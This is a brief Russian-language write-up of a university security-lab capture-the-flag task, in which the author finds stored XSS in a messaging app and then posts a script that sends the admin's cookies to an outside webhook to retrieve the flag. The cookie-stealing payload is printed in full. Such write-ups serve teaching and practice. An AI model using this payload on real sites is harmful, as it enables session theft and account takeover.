### Pwnitter - http://pwnitter.tasks.prak.seclab.cs.msu.ru/

Если отправить сообщение `script>alert(1)</script>` и зайти в мессэдж - выходит
модальное окно с алертом.  
==> Значит выполняется то, что я отправляю  

Нужно зайти на аккаунт главного

Отправим `<script>location.href="https://webhook.site/b58ae2d1-50b1-44e1-b88c-9acd2ad9bbdc?"+document.cookie</script>`

На вебхук приходят кукки, там уже есть флаг на аккаунте
